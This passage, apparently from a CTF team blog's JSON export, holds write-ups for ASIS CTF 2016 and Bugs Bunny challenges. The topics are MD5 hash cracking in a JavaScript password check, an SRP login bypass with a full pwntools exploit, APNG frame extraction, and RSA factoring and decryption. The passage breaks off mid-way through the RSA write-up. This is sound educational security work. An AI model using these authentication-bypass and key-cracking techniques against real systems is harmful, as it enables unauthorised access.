WordToHex(lValue) &#123; var WordToHexValue = \"\", WordToHexValue_temp = \"\", lByte, lCount; for (lCount = 0; lCount &lt;= 3; lCount++) &#123; lByte = (lValue &gt;&gt;&gt; (lCount * 8)) &amp; 255; WordToHexValue_temp = \"0\" + lByte.toString(16); WordToHexValue = WordToHexValue + WordToHexValue_temp.substr(WordToHexValue_temp.length - 2, 2); &#125; return WordToHexValue; &#125;; function Utf8Encode(string) &#123; string = string.replace(/\\r\\n/g, \"\\n\"); var result = Array(); for (var n = 0; n &lt; string.length; n++) &#123; var c = string.charCodeAt(n); if (c &lt; 128) &#123; result.push(c); &#125; else if ((c &gt; 127) &amp;&amp; (c &lt; 2048)) &#123; result.push((c &gt;&gt; 6) | 192); result.push((c &amp; 63) | 128); &#125; else &#123; result.push((c &gt;&gt; 12) | 224); result.push(((c &gt;&gt; 6) &amp; 63) | 128); result.push((c &amp; 63) | 128); &#125; &#125; return result; &#125;; var x = Array(); var k, AA, BB, CC, DD, a, b, c, d; var S11 = 7, S12 = 12, S13 = 17, S14 = 22; var S21 = 5, S22 = 9, S23 = 14, S24 = 20; var S31 = 4, S32 = 11, S33 = 16, S34 = 23; var S41 = 6, S42 = 10, S43 = 15, S44 = 21; var bytes = Utf8Encode(string); x = CTWA(bytes); a = 0x67452301; b = 0xEFCDAB89; c = 0x98BADCFE; d = 0x10325476; for (k = 0; k &lt; x.length; k += 16) &#123; AA = a; BB = b; CC = c; DD = d; a = FF(a, b, c, d, x[k + 0], S11, 0xD76AA478); d = FF(d, a, b, c, x[k + 1], S12, 0xE8C7B756); c = FF(c, d, a, b, x[k + 2], S13, 0x242070DB); b = FF(b, c, d, a, x[k + 3], S14, 0xC1BDCEEE); a = FF(a, b, c, d, x[k + 4], S11, 0xF57C0FAF); d = FF(d, a, b, c, x[k + 5], S12, 0x4787C62A); c = FF(c, d, a, b, x[k + 6], S13, 0xA8304613); b = FF(b, c, d, a, x[k + 7], S14, 0xFD469501); a = FF(a, b, c, d, x[k + 8], S11, 0x698098D8); d = FF(d, a, b, c, x[k + 9], S12, 0x8B44F7AF); c = FF(c, d, a, b, x[k + 10], S13, 0xFFFF5BB1); b = FF(b, c, d, a, x[k + 11], S14, 0x895CD7BE); a = FF(a, b, c, d, x[k + 12], S11, 0x6B901122); d = FF(d, a, b, c, x[k + 13], S12, 0xFD987193); c = FF(c, d, a, b, x[k + 14], S13, 0xA679438E); b = FF(b, c, d, a, x[k + 15], S14, 0x49B40821); a = GG(a, b, c, d, x[k + 1], S21, 0xF61E2562); d = GG(d, a, b, c, x[k + 6], S22, 0xC040B340); c = GG(c, d, a, b, x[k + 11], S23, 0x265E5A51); b = GG(b, c, d, a, x[k + 0], S24, 0xE9B6C7AA); a = GG(a, b, c, d, x[k + 5], S21, 0xD62F105D); d = GG(d, a, b, c, x[k + 10], S22, 0x2441453); c = GG(c, d, a, b, x[k + 15], S23, 0xD8A1E681); b = GG(b, c, d, a, x[k + 4], S24, 0xE7D3FBC8); a = GG(a, b, c, d, x[k + 9], S21, 0x21E1CDE6); d = GG(d, a, b, c, x[k + 14], S22, 0xC33707D6); c = GG(c, d, a, b, x[k + 3], S23, 0xF4D50D87); b = GG(b, c, d, a, x[k + 8], S24, 0x455A14ED); a = GG(a, b, c, d, x[k + 13], S21, 0xA9E3E905); d = GG(d, a, b, c, x[k + 2], S22, 0xFCEFA3F8); c = GG(c, d, a, b, x[k + 7], S23, 0x676F02D9); b = GG(b, c, d, a, x[k + 12], S24, 0x8D2A4C8A); a = HH(a, b, c, d, x[k + 5], S31, 0xFFFA3942); d = HH(d, a, b, c, x[k + 8], S32, 0x8771F681); c = HH(c, d, a, b, x[k + 11], S33, 0x6D9D6122); b = HH(b, c, d, a, x[k + 14], S34, 0xFDE5380C); a = HH(a, b, c, d, x[k + 1], S31, 0xA4BEEA44); d = HH(d, a, b, c, x[k + 4], S32, 0x4BDECFA9); c = HH(c, d, a, b, x[k + 7], S33, 0xF6BB4B60); b = HH(b, c, d, a, x[k + 10], S34, 0xBEBFBC70); a = HH(a, b, c, d, x[k + 13], S31, 0x289B7EC6); d = HH(d, a, b, c, x[k + 0], S32, 0xEAA127FA); c = HH(c, d, a, b, x[k + 3], S33, 0xD4EF3085); b = HH(b, c, d, a, x[k + 6], S34, 0x4881D05); a = HH(a, b, c, d, x[k + 9], S31, 0xD9D4D039); d = HH(d, a, b, c, x[k + 12], S32, 0xE6DB99E5); c = HH(c, d, a, b, x[k + 15], S33, 0x1FA27CF8); b = HH(b, c, d, a, x[k + 2], S34, 0xC4AC5665); a = II(a, b, c, d, x[k + 0], S41, 0xF4292244); d = II(d, a, b, c, x[k + 7], S42, 0x432AFF97); c = II(c, d, a, b, x[k + 14], S43, 0xAB9423A7); b = II(b, c, d, a, x[k + 5], S44, 0xFC93A039); a = II(a, b, c, d, x[k + 12], S41, 0x655B59C3); d = II(d, a, b, c, x[k + 3], S42, 0x8F0CCC92); c = II(c, d, a, b, x[k + 10], S43, 0xFFEFF47D); b = II(b, c, d, a, x[k + 1], S44, 0x85845DD1); a = II(a, b, c, d, x[k + 8], S41, 0x6FA87E4F); d = II(d, a, b, c, x[k + 15], S42, 0xFE2CE6E0); c = II(c, d, a, b, x[k + 6], S43, 0xA3014314); b = II(b, c, d, a, x[k + 13], S44, 0x4E0811A1); a = II(a, b, c, d, x[k + 4], S41, 0xF7537E82); d = II(d, a, b, c, x[k + 11], S42, 0xBD3AF235); c = II(c, d, a, b, x[k + 2], S43, 0x2AD7D2BB); b = II(b, c, d, a, x[k + 9], S44, 0xEB86D391); a = AU(a, AA); b = AU(b, BB); c = AU(c, CC); d = AU(d, DD); &#125; var temp = WordToHex(a) + WordToHex(b) + WordToHex(c) + WordToHex(d); return temp.toLowerCase();&#125;__seceret = '622b010e27e3f82d0f4e2e69a3785a395767c7a39599aea7114553448239eb41cab90bfecd4a8a0881d0a8128f27c483';var _=__=___='';for (var i = 0; i &lt; __seceret.length; i+=3) &#123; _+=__seceret[i+0]; __+=__seceret[i+1]; ___+=__seceret[i+2];&#125;var h = prompt(\"Please enter your passowrd\");if(generate(h[11]+h[8]+h[1]+h[0]+h[9]+h[4]+h[13]) == _ &amp;&amp; generate(h[15]+h[10]+h[3]+h[5]+h[6]) ==__ &amp;&amp; generate(h[16]+h[12]+h[14]+h[2]+h[7])==___)&#123; alert('your flag is Bugs_Bunny&#123;'+h+'&#125;');&#125;else&#123; alert('I\\'m sorry my son it\\' not easy');&#125; I’ve seen this before and realized this was almost the same challenge it happened in trend micro ctf about 1 year ago, which for coincidence did a write up for it! you can check it up here https://kinyabitch.wordpress.com/2016/07/31/ctf/.Doing a fast analysis to the code we can see that the “generate function” is actually an known hash function which you could quickly find it by just searching it on google to identify it as md5 and find it in places like this https://gist.github.com/nduphuong/752463 1234567891011121314__seceret = '622b010e27e3f82d0f4e2e69a3785a395767c7a39599aea7114553448239eb41cab90bfecd4a8a0881d0a8128f27c483';var _=__=___='';for (var i = 0; i &lt; __seceret.length; i+=3) &#123; _+=__seceret[i+0]; __+=__seceret[i+1]; ___+=__seceret[i+2];&#125;var h = prompt(\"Please enter your passowrd\");if(generate(h[11]+h[8]+h[1]+h[0]+h[9]+h[4]+h[13]) == _ &amp;&amp; generate(h[15]+h[10]+h[3]+h[5]+h[6]) ==__ &amp;&amp; generate(h[16]+h[12]+h[14]+h[2]+h[7])==___)&#123; alert('your flag is Bugs_Bunny&#123;'+h+'&#125;');&#125;else&#123; alert('I\\'m sorry my son it\\' not easy');&#125; Now analysing the rest of the code we can see that variable seceret is splited into 3 variables “_”, ““ and “___”. If you ran this code on your browser you could easily find the values of these 3 variables instead of doing the calculations: 1234_ = 6b07fd4ea837c39e1542e1bbca01a224 __ = 20ee80e63596799a1543bc9fd88d8878 ___ = 21232f297a57a5a743894a0e4a801fc3 This are obviously md5 hashes now cracking them(john the ripper, hashcat or even searching the hashes on google) will get: 12346b07fd4ea837c39e1542e1bbca01a224 -&gt; tunisia20ee80e63596799a1543bc9fd88d8878 -&gt; bunny21232f297a57a5a743894a0e4a801fc3 -&gt; admin 123456if(generate(h[11]+h[8]+h[1]+h[0]+h[9]+h[4]+h[13]) == _ &amp;&amp; generate(h[15]+h[10]+h[3]+h[5]+h[6]) ==__ &amp;&amp; generate(h[16]+h[12]+h[14]+h[2]+h[7])==___)&#123; alert('your flag is Bugs_Bunny&#123;'+h+'&#125;');&#125;else&#123; alert('I\\'m sorry my son it\\' not easy');&#125; Analysing the password verification we can see that the that instruction to be true we will need those strings concatenation be our cracked hashes: 1234h[11]+h[8]+h[1]+h[0]+h[9]+h[4]+h[13] = 't'+'u'+'n'+'i'+'s'+'i'+'a';h[15]+h[10]+h[3]+h[5]+h[6] = 'b'+'u'+'n'+'n'+'y';h[16]+h[12]+h[14]+h[2]+h[7] = 'a'+'d'+'m'+'i'+'n'; Now reordering the string from the index 0 to 16 we get “inininynusutdamba”. We can conclude that is the password to be entered into the prompt, after submitting it the flag showed up at the webpage.","categories":[{"name":"Web","slug":"Web","permalink":"https://teamrocketist.github.io/categories/Web/"}],"tags":[{"name":"web","slug":"web","permalink":"https://teamrocketist.github.io/tags/web/"},{"name":"bruteforce","slug":"bruteforce","permalink":"https://teamrocketist.github.io/tags/bruteforce/"},{"name":"md5","slug":"md5","permalink":"https://teamrocketist.github.io/tags/md5/"}]},{"title":"[Crypto] ASIS CTF Finals 2016 - SRPP [Secure Remote Password Protocol]","slug":"Crypto-ASIS-CTF-Finals-2016-SRPP-Secure-Remote-Password-Protocol","date":"2016-09-14T03:12:59.000Z","updated":"2017-08-10T02:59:35.385Z","comments":true,"path":"2016/09/14/Crypto-ASIS-CTF-Finals-2016-SRPP-Secure-Remote-Password-Protocol/","link":"","permalink":"https://teamrocketist.github.io/2016/09/14/Crypto-ASIS-CTF-Finals-2016-SRPP-Secure-Remote-Password-Protocol/","excerpt":"","text":"Average: 2.83Rating Count: 12You Rated: Not ratedPoints231Solves35CategoryCryptoDescription Try to crack our super safe cryptography system and find the flag. nc srpp.asis-ctf.ir 22778http://asis-ctf.ir/tasks/srpp.txz_baa9ec300fd3488a8417fc849a07c2aaf5a26224 Server.py (given by the challenge) 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126#!/usr/bin/python# -*- coding: UTF-8 -*-import socketimport time from hashlib import *from thread import *from Crypto.Util.number import *from os import urandomfrom random import *from string import *from secret import password, flag_port = int(sys.argv[1])_timeout = 3 _host = ''_bufsize = 4096_logfile = open(str(sys.argv[0]) + '.log', 'a')_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)_socket.bind((_host, _port))_socket.listen(_bufsize)_taskname = 'SRPP'_hash = 'sha512'def Hash(*args): a = ':'.join(str(a) for a in args) return int(sha256(a).hexdigest(), 16)def getParams(nbit): N = getPrime(nbit) g = 2 k = Hash(N, g) return(N, g, k)def clientThread(client): client.send('Bot detection: Are you ready?' + '\\n') A = ''.join([choice(printable[:62]) for x in range(26)]) print A[:4] msg = 'ASIS needs proof of work to start the ' + _taskname + ' challenge.\\n' + _hash.upper() + '(X + \"%s\").hexdigest() = \"%s...\",\\nX is an alphanumeric string and |X| = 4\\nEnter X: ' % (A[4:], sha512(A).hexdigest()[:32]) client.send(msg) X = client.recv(_bufsize).strip() if sha256(X + A[4:]).hexdigest() == sha256(A).hexdigest(): client.settimeout(_timeout) client.send('Good work, Let\\'s Go!' + '\\n') nbit = 1024 params = getParams(nbit) N, g, k = params email = 'admin@asis-ctf.ir' client.send('Please login as \"admin@asis-ctf.ir\" and get the flag:' + '\\n') client.send('Sever is generating the parameters ...' + '\\n') client.send('params = (N, g, k) = ' + str(params) + '\\n') salt = urandom(32) N, g, _ = params x = Hash(salt, email, password) verifier = pow(g, x, N) while True: try: client.send('Send the email address and the public random positive value A seperated by \",\" as \"email, A\": ' + '\\n') ans = client.recv(_bufsize).strip() print ans try: email, A = ans.split(',') A = int(A) assert (A != 0 and A != N), client.send('Are you kidding me?! :P' + '\\n') assert email == 'admin@asis-ctf.ir', client.send('You should login as admin@asis-ctf.ir' + '\\n') b = getRandomRange(1, N) B = (k * verifier + pow(g, b, N)) % N client.send('(salt, public_ephemeral) = (%s, %d) \\n' % (salt.encode('base64')[:-1], B)) print gmpy.invert(B) u = Hash(A, B) client.send('Send the session key: ' + '\\n') K_client = client.recv(_bufsize).strip() assert K_client.isdigit(), client.send('Please send a valid positive integer as session key.' + '\\n') K_client = int(K_client) S_s = pow(A * pow(verifier, u, N), b, N) K_server = Hash(S_s) client.send('Send a POC of session key: ' + '\\n') M_client = client.recv(_bufsize).strip() assert M_client.isdigit(), client.send('Please send valid positive integer as POC.' + '\\n') M_client = int(M_client) assert (K_server == K_client), client.send('The session key is not correct!' + '\\n') assert (M_client == Hash(Hash(N) ^ Hash(g), Hash(email), salt, A, B, K_client)), client.send('The POC is not correct!' + '\\n') M_server = Hash(A, M_client, K_server) # TODO: check server POC in clinet side client.send('Great, you got the flag: ' + flag + '\\n') client.close() break except: client.send('Provided input is not valid.' + '\\n') client.send('Quiting ...' + '\\n') client.close() break except socket.timeout: client.send('Timeout! Plase send faster ... \\n') client.close() break else: client.send('Sorry, Bad proof of work! \\n') client.close()while True: client, addr = _socket.accept() start_new_thread(clientThread ,(client,))s.close() To solve this you needed to realise that A = 2N ≡ 0 (mod N). The web server was checking only for values like A = 0 or A = N. To beat the system you only need to set the A to A = 2N and set the session key to 0 and hash it: 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667686970717273import refrom pwn import *from string import *from hashlib import *from os import urandomfrom itertools import productfrom Crypto.Util.number import *def Hash(*args): a = ':'.join(str(a) for a in args) return int(sha256(a).hexdigest(), 16)def is_solution(s, sol): return sol == sha512(s).hexdigest()[:32]def parse(s): #m = re.search('\\\"[a-zA-Z0-9]*\\\"', s) m = re.findall(r'\\\"[a-zA-Z0-9.]*\\\"', s) salt = m[0][1:-1] first16bytes = m[1][1:-4] return salt, first16bytesdef regex_parse(regex, s): m = re.findall(regex, s) return mdef bot_system(junk): salt, sol = parse(junk) chars = digits + ascii_uppercase + ascii_lowercase for n in range(4, 4 + 1): for comb in product(chars, repeat=n): x = ''.join(comb) if is_solution(x.rstrip() + salt.rstrip(), sol): r.sendline(x) return r.recvuntil(\"Send the email address and the public random positive value A seperated by \\\",\\\" as \\\"email, A\\\":\") r.sendline(\"2ewq\") return r.recvline()if __name__ == '__main__': email = 'admin@asis-ctf.ir' context(arch='i386', os='linux') r = remote('srpp.asis-ctf.ir', 22778) junk = r.recvuntil('Enter X:') print junk junk = bot_system(junk) print junk N, g, k = regex_parse(r\"[0-9]+\", junk) A = 2 * long(N) r.sendline('%s,%d' % (email, A)) junk = r.recvuntil(\"Send the session key:\") print junk salt, B = regex_parse( r'(?:[A-Za-z0-9+/]&#123;4&#125;)&#123;2,&#125;(?:[A-Za-z0-9+/]&#123;2&#125;[AEIMQUYcgkosw048]=|[A-Za-z0-9+/][AQgw]==|[0-9]+)', junk) x = Hash(salt.decode('base64'), email, 'x') u = Hash(A, B) K_client = str(Hash(0)) r.sendline(K_client) junk = r.recvuntil(\"Send a POC of session key:\") print junk M_client = Hash(Hash(long(N)) ^ Hash(long(g)), Hash(email), salt.decode('base64'), long(A), long(B), K_client) r.sendline(str(M_client)) junk = r.recvall(timeout=3) print junk # r.sendline(321) # print r.recvall(timeout=2) Requirements to run the code above: capstone==3.0.4cffi==1.8.2cryptography==1.5enum34==1.1.6idna==2.1ipaddress==1.0.17Mako==1.0.4MarkupSafe==0.23paramiko==2.0.2pluggy==0.3.1psutil==4.3.1pwn==1.0pwntools==3.0.2py==1.4.31pyasn1==0.1.9pycparser==2.14pycrypto==2.6.1pyelftools==0.24Pygments==2.1.3pyserial==3.1.1PySocks==1.5.7python-dateutil==2.5.3requests==2.11.1ROPGadget==5.4six==1.10.0tox==2.3.1virtualenv==15.0.3 Running it: 12345678910111213141516171819202122(env)kinyabitch@Debian ~/h/c/a/c/SRPP&gt; python srpp.py[+] Opening connection to srpp.asis-ctf.ir on port 22778: DoneBot detection: Are you ready?ASIS needs proof of work to start the SRPP challenge.SHA512(X + \"Qdir2gMmUNfQTEWws7TiiC\").hexdigest() = \"6ab9e49f8f1666eedbfcd245641494b5...\",X is an alphanumeric string and |X| = 4Enter X: Good work, Let's Go!Please login as \"admin@asis-ctf.ir\" and get the flag:Sever is generating the parameters ...params = (N, g, k) = (150264492626393812114930741471401106498656623083068639913262819178319899775751847281352721734537734815860211276875675213404746620022806433472801532459549667439961097968054640742518648454976403201201715934962422442028556067288440471827328146158430586959765296795581920036648128166307787893201848761850772213819L, 2, 24575437478632421856161724587288271515505936432761108412190739330057705715583L)Send the email address and the public random positive value A seperated by \",\" as \"email, A\": (salt, public_ephemeral) = (xqP2u8/GnuOlvvwzqQyDSCzKdub3VSlC7hqSVgViCn0=, 58941979940718432698750128575222177241044268927849539714742170613086773456642367825722147824342183209059606531876412131592206870210224884096962602048579555044090406168925997732687622279935969221985354817678067387309953487365627666658193178058756987452583249987259227031087509426824835666790488037514334092494) Send the session key: Send a POC of session key:[+] Receiving all data: Done (66B)[*] Closed connection to srpp.asis-ctf.ir port 22778 Great, you got the flag: ASIS&#123;7bdb4b540699ef341f4a3b32469cd3f6&#125;","categories":[{"name":"Crypto","slug":"Crypto","permalink":"https://teamrocketist.github.io/categories/Crypto/"}],"tags":[{"name":"crypto","slug":"crypto","permalink":"https://teamrocketist.github.io/tags/crypto/"},{"name":"login","slug":"login","permalink":"https://teamrocketist.github.io/tags/login/"}]},{"title":"[Forensics] ASIS CTF finals 2016 - p1ng","slug":"Forensics-ASIS-CTF-finals-2016-p1ng","date":"2016-09-14T02:33:03.000Z","updated":"2017-08-10T02:43:59.878Z","comments":true,"path":"2016/09/14/Forensics-ASIS-CTF-finals-2016-p1ng/","link":"","permalink":"https://teamrocketist.github.io/2016/09/14/Forensics-ASIS-CTF-finals-2016-p1ng/","excerpt":"","text":"Average: 3.60Rating Count: 5You Rated: Not ratedPoints121Solves24CategoryForensicDescription p1ng is ASIS hand-drawn PNG.http://asis-ctf.ir/tasks/p1ng.txz_76eca77720a65d95557a3850929abd0a8a18c636 We have a png file inspecting with binwalk we can see this strange compressed data: 1234567891011121314151617181920212223242526272829kinyabitch@Debian ~/h/c/a/f/p1ng&gt; binwalk p1ng/p1ngDECIMAL HEXADECIMAL DESCRIPTION--------------------------------------------------------------------------------0 0x0 PNG image, 180 x 76, 8-bit/color RGBA, non-interlaced99 0x63 Zlib compressed data, best compression4987 0x137B Zlib compressed data, best compression9484 0x250C Zlib compressed data, best compression17713 0x4531 Zlib compressed data, best compression22512 0x57F0 Zlib compressed data, best compression29380 0x72C4 Zlib compressed data, best compression36947 0x9053 Zlib compressed data, best compression43723 0xAACB Zlib compressed data, best compression51878 0xCAA6 Zlib compressed data, best compression58000 0xE290 Zlib compressed data, best compression65549 0x1000D Zlib compressed data, best compression72231 0x11A27 Zlib compressed data, best compression79133 0x1351D Zlib compressed data, best compression85159 0x14CA7 Zlib compressed data, best compression92012 0x1676C Zlib compressed data, best compression98842 0x1821A Zlib compressed data, best compression105524 0x19C34 Zlib compressed data, best compression113043 0x1B993 Zlib compressed data, best compression119801 0x1D3F9 Zlib compressed data, best compression127259 0x1F11B Zlib compressed data, best compression134259 0x20C73 Zlib compressed data, best compression139926 0x22296 Zlib compressed data, best compression146983 0x23E27 Zlib compressed data, best compression if we inspect with a hex editor or even easier using pngsplit to split the png chunks we can find some unusual type chunks like fdAT, fcTL and acTL: 123456kinyabitch@Debian ~/h/c/a/f/p1ng&gt; ls p1ng/qwe/p1ng.0000.sig p1ng.0004.IDAT p1ng.0008.fdAT p1ng.0012.fdAT p1ng.0016.fdAT p1ng.0020.fdAT p1ng.0024.fdAT p1ng.0028.fdAT p1ng.0032.fdAT p1ng.0036.fdAT p1ng.0040.fdAT p1ng.0044.fdAT p1ng.0048.fdATp1ng.0001.IHDR p1ng.0005.fcTL p1ng.0009.fcTL p1ng.0013.fcTL p1ng.0017.fcTL p1ng.0021.fcTL p1ng.0025.fcTL p1ng.0029.fcTL p1ng.0033.fcTL p1ng.0037.fcTL p1ng.0041.fcTL p1ng.0045.fcTL p1ng.0049.IENDp1ng.0002.acTL p1ng.0006.fdAT p1ng.0010.fdAT p1ng.0014.fdAT p1ng.0018.fdAT p1ng.0022.fdAT p1ng.0026.fdAT p1ng.0030.fdAT p1ng.0034.fdAT p1ng.0038.fdAT p1ng.0042.fdAT p1ng.0046.fdATp1ng.0003.fcTL p1ng.0007.fcTL p1ng.0011.fcTL p1ng.0015.fcTL p1ng.0019.fcTL p1ng.0023.fcTL p1ng.0027.fcTL p1ng.0031.fcTL p1ng.0035.fcTL p1ng.0039.fcTL p1ng.0043.fcTL p1ng.0047.fcTL After some search on google I found this links https://wiki.mozilla.org/APNG_Specification and http://fileformats.wikia.com/wiki/Animated_Portable_Network_Graphics , this is a APNG it’s a png but animated! So our job here is to split the animation images and then maybe we can find the flag. There is a lot of tools online to do this but for the curiosity I managed to write one in python, some images were broken I needed to do some adjustments to the IDHR header to fix it: 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136137138139140141import osimport sysimport structimport binasciidirectory = \"outp/\"signature = \"\"ihdr_header = \"\"fdat_chunk = \"\"idat_chunk = \"\"iend_chunk = \"\"ihdrs = []parts = []PNG_SIGN = b\"\\x89\\x50\\x4E\\x47\\x0D\\x0A\\x1A\\x0A\"def is_png(png): \"\"\"Test if @png is valid png file by checking signature @png can be str of the filename, a file-like object, or a bytes object. \"\"\" if isinstance(png, str): with open(png, \"rb\") as f: png = f.read(8) if hasattr(png, \"read\"): png = png.read(8) return png[:8] == PNG_SIGNdef chunks(png): \"\"\"Yield chunks from png. @png can be a string of filename, a file-like object, or a bytes bject. \"\"\" if not is_png(png): # convert to png if isinstance(png, bytes): with io.BytesIO(png) as f: with io.BytesIO() as f2: PIL.Image.open(f).save(f2, \"PNG\", optimize=True) png = f2.getvalue() else: with io.BytesIO() as f2: PIL.Image.open(png).save(f2, \"PNG\", optimize=True) png = f2.getvalue() if isinstance(png, str): # file name with open(png, \"rb\") as f: png = f.read() if hasattr(png, \"read\"): # file like png = png.read() return chunks_read(png)def make_chunk(type, data): \"\"\"Create chunk with @type and chunk data @data. It will calculate length and crc for you. Return bytes. @type is str and @data is bytes. \"\"\" out = struct.pack(\"!I\", len(data)) data = type.encode(\"latin-1\") + data a = '%08x' % (binascii.crc32(data) % (1&lt;&lt;32)) out += data + a.decode('hex') return outdef chunks_read(b): \"\"\"Parse PNG bytes into different chunks, yielding (type, data). @type is a string of chunk type. @data is the bytes of the chunk. Including length, type, data, and crc. \"\"\" # skip signature i = 8 # yield chunks while i &lt; len(b): data_len, = struct.unpack(\"!I\", b[i:i + 4]) type = b[i + 4:i + 8].decode(\"latin-1\") yield type, b[i:i + data_len + 12] i += data_len + 12# 6 if __name__ == '__main__': i = 0 t = 0 frame_chunks = [] frames = [] for ctype, data in list(chunks('p1ng/p1ng')): if ctype == \"IHDR\": ihdr_header = data hdr = ihdr_header elif ctype == \"acTL\": # ignore Animation Control Chunk continue elif ctype == \"fcTL\": # https://wiki.mozilla.org/APNG_Specification#.60fcTL.60:_The_Frame_Control_Chunk \"\"\" \"\"\" c = struct.unpack(\"!IIIIHHbb\", data[12:-4]) width = 180 height = 76 if i in [11,12,13,2,9]: width = c[0] height = c[1] if i in [7,13,21,22]: width -= 1 #height = c[1] if i == 6: width -= 2 print c ihdr = make_chunk(\"IHDR\", struct.pack(\"!II\", width + c[2], height+ c[3]) + hdr[16:-4]) ihdrs.append(ihdr) #i += 1 elif ctype == \"IDAT\": parts.append((\"IDAT\", data)) i += 1 elif ctype == \"fdAT\": # https://wiki.mozilla.org/APNG_Specification#.60fdAT.60:_The_Frame_Data_Chunk parts.append((\"IDAT\", make_chunk(\"IDAT\", data[12:-4]))) i += 1 elif ctype == \"IEND\": iend_chunk= data break if not os.path.exists(directory): os.makedirs(directory) for i in range(len(parts)): #parts[i] = PNG_SIGN + parts[0] + pallets[i] + parts[i] + parts[-1] f = open(directory + 'p1ng%d.png' % i, 'w+') if i == 0: ihdrs[i] = ihdr_header f.write(PNG_SIGN + ihdrs[i] + parts[i][1] + iend_chunk) f.close() After running the script you can get 22 imgs splited into a directory, after joining them you can construct the flag:ASIS{As_l0n9_4s_CTF_3x1sts_th3r3_w1ll_b3_ASIS_4nd_4s_l0n9_4s_ASIS_3x1sts_th3r3_w1ll_b3_PNG!}","categories":[{"name":"Forensics","slug":"Forensics","permalink":"https://teamrocketist.github.io/categories/Forensics/"}],"tags":[{"name":"png","slug":"png","permalink":"https://teamrocketist.github.io/tags/png/"},{"name":"forensics","slug":"forensics","permalink":"https://teamrocketist.github.io/tags/forensics/"}]},{"title":"ASIS CTF finals - RSA","slug":"ASIS-CTF-finals-RSA","date":"2016-09-11T17:23:20.000Z","updated":"2017-08-10T02:37:59.387Z","comments":true,"path":"2016/09/11/ASIS-CTF-finals-RSA/","link":"","permalink":"https://teamrocketist.github.io/2016/09/11/ASIS-CTF-finals-RSA/","excerpt":"","text":"Average: 4.18Rating Count: 22You Rated: Not ratedPoints113Solves64CategoryCryptoDescriptionFind the flag.http://asis-ctf.ir/tasks/rsa.txz_93b525e771c284b7a3f0bb45b290ce56987c5834 After extracting analysing the server.py file 1234567891011121314151617181920212223242526272829303132333435#!/usr/bin/pythonimport gmpyfrom Crypto.Util.number import *from Crypto.PublicKey import RSAfrom Crypto.Cipher import PKCS1_v1_5flag = open('flag', 'r').read() * 30def ext_rsa_encrypt(p, q, e, msg): m = bytes_to_long(msg) while True: n = p * q try: phi = (p - 1)*(q - 1) d = gmpy.invert(e, phi) pubkey = RSA.construct((long(n), long(e))) key = PKCS1_v1_5.new(pubkey) enc = key.encrypt(msg).encode('base64') return enc except: p = gmpy.next_prime(p**2 + q**2) q = gmpy.next_prime(2*p*q) e = gmpy.next_prime(e**2)p = getPrime(128)q = getPrime(128)n = p*qe = getPrime(64)pubkey = RSA.construct((long(n), long(e)))f = open('pubkey.pem', 'w')f.write(pubkey.exportKey())g = open('flag.enc', 'w')g.write(ext_rsa_encrypt(p, q, e, flag)) Looks like a simple RSA encryption there are some strange things hapening here like the While True look with a try catch and “open(‘flag’, ‘r’).read() * 30”, we will see why this happens later right now we need to get our modulus N and e from the pubkey.pem file: 1234567891011121314(.env)kinyabitch@Debian ~/h/c/a/c/r/RSA&gt; openssl rsa -in pubkey.pem -pubin -text -modulusPublic-Key: (256 bit)Modulus: 00:d8:e2:4c:12:b7:b9:9e:fe:0a:9b:c0:4a:6a:3d: f5:8a:2a:94:42:69:b4:92:b7:37:6d:f1:29:02:3f: 20:61:b9Exponent: 12405943493775545863 (0xac2ac3e0ca0f5607)Modulus=D8E24C12B7B99EFE0A9BC04A6A3DF58A2A944269B492B7376DF129023F2061B9writing RSA key-----BEGIN PUBLIC KEY-----MEIwDQYJKoZIhvcNAQEBBQADMQAwLgIhANjiTBK3uZ7+CpvASmo99YoqlEJptJK3N23xKQI/IGG5AgkArCrD4MoPVgc=-----END PUBLIC KEY----- Now that we have the modulus and the Exponent we will try to factor modulus N with yafu (https://github.com/DarkenCode/yafu): 123456789101112131415161718192021222324(.env)kinyabitch@Debian ~/h/c/a/c/r/RSA&gt;; ../../../../../crl/RSA2/bin/yafu \"factor(0xD8E24C12B7B99EFE0A9BC04A6A3DF58A2A944269B492B7376DF129023F2061B9)\" -threads 10fac: factoring 98099407767975360290660227117126057014537157468191654426411230468489043009977fac: using pretesting plan: normalfac: no tune info: using qs/gnfs crossover of 95 digitsstarting SIQS on c77: 98099407767975360290660227117126057014537157468191654426411230468489043009977==== sieving in progress (10 threads): 36224 relations needed ======== Press ctrl-c to abort and save state ====SIQS elapsed time = 1.9290 seconds.Total factoring time = 2.0017 seconds***factors found***P39 = 315274063651866931016337573625089033553P39 = 311155972145869391293781528370734636009ans = 1 Now that we have the p and q we can get the private key using rsatool(https://github.com/ius/rsatool) 12345678(.env)kinyabitch@Debian ~/h/c/a/c/r/RSA&gt; rsatool/rsatool.py -p 311155972145869391293781528370734636009 -q 315274063651866931016337573625089033553 -e 12405943493775545863 -o priv.key(.env)kinyabitch@Debian ~/h/c/a/c/r/RSA&gt; cat priv.key -----BEGIN RSA PRIVATE KEY-----MIGwAgEAAiEA2OJMEre5nv4Km8BKaj31iiqUQmm0krc3bfEpAj8gYbkCCQCsKsPgyg9WBwIgHtnKUU3mNRl9yzxb34oYadECnCy7c1afLXiBA6d8n7cCEQDqFnXdoXEPZrAQBssgWxvpAhEA7S+Tc+wBhnqru7wF2RkFUQIQNRmCtiEP0S+6uyda8zCbJwIRAJ5Uoh8oF1sz+8MdyveAYncCEB/QjyrzneAoX5X8HRjafQM=-----END RSA PRIVATE KEY----- And now writing a little script with python to decrypt our cipher text: 1234567891011121314151617181920from Crypto.PublicKey import RSAfrom Crypto.Cipher import PKCS1_v1_5, PKCS1_OAEPfrom base64 import b64decodefrom Crypto.Hash import SHAfrom Crypto import Randomimport subprocessimport sysdef decrypt_RSA(privkey,message): key = open(privkey, \"r\").read() dsize = SHA.digest_size sentinel = Random.new().read(15+dsize) rsakey = RSA.importKey(key) rsakey = PKCS1_v1_5.new(rsakey) decrypted = rsakey.decrypt(b64decode(message), None) return decryptedprint decrypt_RSA('priv.key', sys.argv[1]) 12345678910(.env)kinyabitch@Debian ~/h/c/a/c/r/RSA&gt; python rsa2.py 